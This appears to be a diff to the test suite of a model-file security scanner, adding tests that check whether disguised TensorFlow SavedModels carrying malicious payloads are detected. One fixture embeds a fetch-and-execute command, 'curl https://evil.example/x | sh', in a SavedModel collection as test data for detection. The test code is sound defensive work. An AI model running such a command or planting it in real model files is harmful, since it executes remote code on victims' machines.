@@ -174,6 +174,18 @@ def _build_malicious_tf_savedmodel() -> bytes:
     return cast(bytes, saved_model.SerializeToString())
 
 
+def _build_collection_only_tf_savedmodel() -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
+    return cast(bytes, saved_model.SerializeToString())
+
+
 def _build_malicious_skops_schema() -> bytes:
     """Build a Skops schema that exercises CVE-2025-54412 detection."""
     return json.dumps(
@@ -2393,6 +2405,30 @@ def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: 
     )
 
 
+def test_scan_file_detects_malicious_tf_savedmodel_renamed_with_meta_suffix(tmp_path: Path) -> None:
+    disguised_savedmodel = tmp_path / "saved.meta"
+    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())
+
+    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_savedmodel"
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: Path) -> None:
+    disguised_savedmodel = tmp_path / "collection.jpg"
+    disguised_savedmodel.write_bytes(_build_collection_only_tf_savedmodel())
+
+    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_savedmodel"
+    assert any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)
+
+
 def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp_path: Path) -> None:
     disguised_metagraph = tmp_path / "oversized.jpg"
     seed = _build_malicious_tf_metagraph()
@@ -2424,7 +2460,7 @@ def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp
 
 def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp_path: Path) -> None:
     malformed_payload = tmp_path / "malformed-large.jpg"
-    malformed_payload.write_bytes(b"\x12" + (b"x" * _MAX_PARSE_BYTES))
+    malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))
 
     result = scan_file(str(malformed_payload), config={"cache_enabled": False})
     aggregate = scan_model_directory_or_file(str(malformed_payload), cache_enabled=False)
@@ -2435,17 +2471,18 @@ def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp
     assert core_module.determine_exit_code(aggregate) == 0
 
 
-def test_scan_file_does_not_route_large_generic_field_two_protobuf_as_tensorflow(tmp_path: Path) -> None:
+def test_scan_file_routes_large_field_two_protobuf_to_fail_closed_tensorflow_scan(tmp_path: Path) -> None:
     generic_payload = tmp_path / "generic-large.jpg"
     generic_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * (_MAX_PARSE_BYTES + 1)))
 
     result = scan_file(str(generic_payload), config={"cache_enabled": False})
     aggregate = scan_model_directory_or_file(str(generic_payload), cache_enabled=False)
 
-    assert result.scanner_name == "unknown"
-    assert result.success is True
-    assert aggregate.success is True
-    assert core_module.determine_exit_code(aggregate) == 0
+    assert result.scanner_name == "tf_metagraph"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
+    assert aggregate.success is False
+    assert core_module.determine_exit_code(aggregate) == 2
 
 
 def test_scan_file_does_not_route_incidental_onnx_pb_string(tmp_path: Path) -> None:
